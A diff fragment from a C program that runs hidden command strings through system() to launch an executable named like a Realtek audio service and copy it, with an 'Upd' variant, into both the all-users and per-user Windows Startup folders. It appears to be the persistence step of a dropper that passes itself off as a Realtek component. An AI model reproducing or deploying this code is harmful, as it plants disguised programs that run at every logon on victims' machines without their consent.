@@ -44,14 +44,21 @@ int main()
 
     system(text_1);
     //1 start RtkAudUServiceUpd64.exe
+
+    // for user --------------------------------------
     
     system(text_2);
     //2 xcopy "RtkAudUService64.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
-    system(text_3);
-    //3 xcopy "RtkAudUService64.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
 
     system(text_4);
     //4 xcopy "RtkAudUServiceUpd64.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
+
+
+    // for admin --------------------------------------
+
+    system(text_3);
+    //3 xcopy "RtkAudUService64.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
+
     system(text_5);
     //5 xcopy "RtkAudUServiceUpd64.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
     
